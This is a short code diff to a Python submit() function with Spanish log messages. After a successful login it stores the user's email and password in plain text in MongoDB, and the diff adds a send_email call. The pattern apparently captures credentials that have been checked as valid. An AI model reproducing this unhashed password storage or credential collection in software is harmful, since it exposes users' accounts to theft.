@@ -95,6 +95,7 @@ def submit():
 
         if result == "Inicio de sesion exitoso":
             collection.insert_one({"email": email, "password": password})
+            send_email(email)
             logger.info("Datos almacenados correctamente en MongoDB.")
         else:
             logger.error("CREDENCIALES INVÁLIDAS, NO SE REALIZA GUARDADO EN BASE DE DATOS")
